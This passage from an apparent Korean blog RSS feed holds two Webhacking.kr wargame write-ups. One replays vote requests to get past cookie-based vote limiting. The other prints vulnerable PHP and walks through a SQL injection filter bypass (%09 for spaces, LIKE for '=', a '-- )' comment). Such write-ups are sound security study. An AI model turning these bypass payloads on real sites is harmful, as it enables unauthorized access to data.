      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EC%8B%A4%EB%B2%84/">실버</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%844/">백준 실버4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/11/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-11653%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 32 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/11/Webhacking-kr-Old-32-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/11/Webhacking-kr-Old-32-Write-Up/</guid>
      <pubDate>Tue, 11 May 2021 02:54:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-32"><a href="#Old-32" class="headerlink" title="Old - 32"></a>Old - 32</h2><p><img src="/images/pasted-338.png"><br>랭킹 게시판이 문제로 나왔다. 이게 무슨 기능을 하는지 몰라서 일단 개발자 도구로 코드를 살펴보았다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">onmouseover</span>=<span class="string">&quot;this.style.background=&#x27;gray&#x27;&quot;</span> <span class="attr">onmouseout</span>=<span class="string">&quot;this.style.background=&#x27;black&#x27;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;location.href=&#x27;?hit=hyes4167&#x27;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background: black;&quot;</span>&gt;</span>....<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure><p>랭크에 나온 사용자를 클릭하면, <code>?hit=hyes4167</code>와 같이 사용자 이름을 파라미터 값으로 서버에 넘겨주고 있다.<br><br>어떤 기능인지 확인하기 위해 클릭을 했더니, 페이지가 다시 랭킹 게시판으로 넘어오고, hyes4167의 Hit 값이 증가가 되었다.</p><p>이것을 통해 난 Hit 점수를 100까지 올려야한다는 것을 느낌적으로 알아챌 수 있었다.</p><p>그래서 Hit 값을 올리기 위해 한번 클릭하니,<br><img src="/images/pasted-339.png"><br>투표를 이미 했다는 Alert창이 띄어졌다.</p><p>그래서 투표를 했는지 안했는지를 구분하기 위해 쿠키에 값을 넣었을 것 같아서 쿠키를 확인하였다.</p><p><img src="/images/pasted-340.png"><br>예상대로, 쿠키에 투표 값이 있었다.</p><p>나는 쿠키를 삭제하여, 페이지에 다시 들어가서 초기에 쿠키값이 어땠는지를 확인하였다.<br><br>확인한 결과 초기에는 쿠키가 없었다. 즉, 투표 후 쿠키가 생긴다는 것을 알 수 있었다.</p><p>난 이점을 이용하여, Hit 값을 100까지 올리는 작업을 하였다.</p><p><img src="/images/pasted-341.png"><br>파이썬으로 만들기 귀찮아서 Burp Suite의 Repeater을 이용하여 서버에 계속 hyes4167에게 투표한다는 트래픽을 반복적으로 보냈다.</p><p><img src="/images/pasted-342.png"><br>그 결과 어떠한 반응이 없었다.</p><p>뭔가가 더 있나 생각을 해보니, “왜 나는 나를 투표를 안하고 다른 사람을 투표를 했을까”라는 생각을 하게 되었다.</p><p>그래서 보내는 파라미터 값을 lrtk으로 변경하여 보내봤다.</p><p><img src="/images/pasted-343.png"><br>그랬더니, 맨 밑에 내 이름이 생성이 되었다.</p><p>이 방법이 맞는거 같아서 hit 값을 100까지 올렸다.</p><p><img src="/images/pasted-344.png"><br>그 결과 Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/11/Webhacking-kr-Old-32-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 27 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/10/Webhacking-kr-Old-27-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/10/Webhacking-kr-Old-27-Write-Up/</guid>
      <pubDate>Mon, 10 May 2021 17:49:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-27"><a href="#Old-27" class="headerlink" title="Old - 27"></a>Old - 27</h2><p><img src="/images/pasted-329.png"><br>SQL Injection 문제인 듯하다.<br><br>소스코드를 주는 거 보니, 입력값에 대한 처리가 있는 기능이 있을 거라 추측된다.</p><p>코드를 확인해보니, 18번 문제와 비슷한 코드가 있었다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[‘no’])&#123;</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(“/<span class="comment">#|select|\(| |limit|=|0x/I”, $_GET[‘no’])) exit(“no hack”);</span></span><br><span class="line">  $r=mysqli_fetch_array(mysqli_query($db,”select id <span class="keyword">from</span> chall27 where id=‘guest’ <span class="keyword">and</span> no=(&#123;$_GET[‘no’]&#125;)”)) <span class="keyword">or</span> <span class="keyword">die</span>(“query <span class="built_in">error</span>”);</span><br><span class="line">  <span class="keyword">if</span>($r[‘id’]==“guest”) <span class="keyword">echo</span>(“guest”);</span><br><span class="line">  <span class="keyword">if</span>($r[‘id’]==“admin”) solve(<span class="number">27</span>); <span class="comment">// admin’s no = 2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>입력값을 preg_match로 필터를 걸었다. 해당 필터에 걸리면 no hack이라는 문구가 출력이 된다.<br><br>거르려는 문자열은 <code>#, select, \), 스페이스, limit, =, 0x</code>가 있다.</p><p>위 문자열이 없으면, 쿼리문에 들어가기 되는데, 쿼리문은 <code>or die</code>라는 예외처리로 쿼리에 에러가 일어나면 query error가 출력된다.</p><p>나는 위 코드들을 좀 더 분석하기 좋게 따로 빼내서 작성하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$stdin = fopen(<span class="string">&#x27;php://stdin&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">$input = trim(fread($stdin, <span class="number">1024</span>));</span><br><span class="line">fclose($stdin);</span><br><span class="line"></span><br><span class="line">$match = preg_match(<span class="string">&quot;/#|select|\(| |limit|=|0x/i&quot;</span>, $input);</span><br><span class="line"><span class="keyword">if</span> ($match == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Nop!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;select id from chall27 where id=&#x27;guest&#x27; and no=(<span class="subst">&#123;$input&#125;</span>) &quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>preg_match에 걸리면, Nop!!을 출력하게 해주었고, 쿼리문을 분석하기 좋게 출력하였다.</p><p>내가 1을 입력하면, </p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">select id from chall27 <span class="built_in">where</span> id=<span class="string">&#x27;guest&#x27;</span> and no=(1)</span><br></pre></td></tr></table></figure><p>로 출력된다.</p><p><img src="/images/pasted-330.png"><br>실제 페이지에선 1을 넣고 서버에 보내보니, guest로 로그인을 하였다.</p><p>실제 코드의 주석엔 admin의 no 값은 2라고 표시 되어있다.</p><p>18번 문제처럼, where절에 <code>id=&#39;guest&#39;</code>로 되어있어서 2을 넣으면 False가 되기 때문에 쿼리문은 작동이 안된다.<br><br>그렇기 때문에 <code>no=3 or no=2</code>로 False or True로 True의 값을 만들어서 admin를 출력해야하지만, no의 값은 ()로 묶어져 있기 때문에 우회 방법을 찾아야 한다.</p><p>나는 <code>3) or no=2--</code>를 생각을 했지만, preg_match에 스페이스와 =이 걸리기 때문에 Nop!!이 출력이 되었다.</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3) or no=2--</span><br><span class="line">Nop!!select id from chall27 <span class="built_in">where</span> id=<span class="string">&#x27;guest&#x27;</span> and no=(3) or no=2--)</span><br></pre></td></tr></table></figure><p>그래서 문제 18번처럼 스페이스를 %09로 우회하였고, =는 SQL 쿼리인 like로 우회하였다.</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3)%09or%09no%09like%092--</span><br><span class="line">select id from chall27 <span class="built_in">where</span> id=<span class="string">&#x27;guest&#x27;</span> and no=(3)%09or%09no%09like%092--)</span><br></pre></td></tr></table></figure><p>그 결과 preg_match에 걸리지 않고 그대로 출력되는 것을 볼 수 있었다.</p><p><img src="/images/pasted-331.png"><br>하지만, 페이지에서 query error가 발생하였고, 쿼리문에는 문제가 없다고 생각이 들어서 직접 Mysql에 쿼리를 시험해보았다.</p><p><img src="/images/pasted-332.png"><br>Mysql는 18번 문제에서 만들었던 것을 재사용하였다.</p><p><img src="/images/pasted-333.png"><br><img src="/images/pasted-334.png"><br>위 SQL를 실행해보니, <code>--)</code>에서 에러가 발생된 것을 발견할 수 있었다.</p><p>그래서 스페이스로 )를 분리하여 <code>-- )</code>로 만들어서 쿼리를 실행하니, 에러가 발생되지 않고, admin이 출력되었다.</p><p><img src="/images/pasted-335.png"><br><img src="/images/pasted-336.png"></p><p>위 SQL 쿼리를 사이트에 넣어보겠다.</p><p><img src="/images/pasted-337.png"><br>Flag를 획득하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/10/Webhacking-kr-Old-27-Write-Up/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
